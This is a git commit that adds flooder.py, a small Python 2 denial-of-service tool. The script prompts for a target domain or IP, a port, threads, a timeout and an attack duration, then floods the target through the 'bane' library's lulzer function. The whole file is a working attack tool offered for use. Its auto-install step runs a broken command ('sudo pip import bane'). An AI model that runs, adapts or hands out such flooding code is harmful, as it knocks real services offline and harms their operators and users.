8c0f637b632e03bf1ddecd6ea98bec5335e28c42
AlaBouali <trap.leader.123@gmail.com>
2019-10-20 20:37:58 +0100

    Add files via upload

---
+++ flooder.py
@@ -0,0 +1,46 @@
+import os,sys
+try:
+ import bane
+except:
+ print"Failed to import a module.\nLet me install it for you.. (if you are using linux you have to execute it as root to install the required module)"
+ if os.path.isdir('/home')==True:
+  os.system('sudo pip import bane')
+ else:
+  os.system('pip import bane')
+import socket
+n=0
+while(n<1):
+ try:
+  u=raw_input('\nTarget Domain/IP: (www.google.com)\n> ')
+  socket.gethostbyname(u)
+  n+=1
+ except:
+  pass
+while(n<2):
+ try:
+  p=input('Port:\n>')
+  n+=1
+ except:
+  pass
+while(n<3):
+ try:
+  th=input('Threads:\n>')
+  n+=1
+ except:
+  pass
+while(n<4):
+ try:
+  ti=input('Timeout:\n>')
+  n+=1
+ except:
+  pass
+while(n<5):
+ try:
+  d=input('Attack\'s duration (in seconds):\n>')
+  n+=1
+ except:
+  pass
+try:
+ bane.lulzer(u,p=p,maxtime=ti,threads=th,interval=d)
+except KeyboardInterrupt:
+ bane.ddos.stop=True
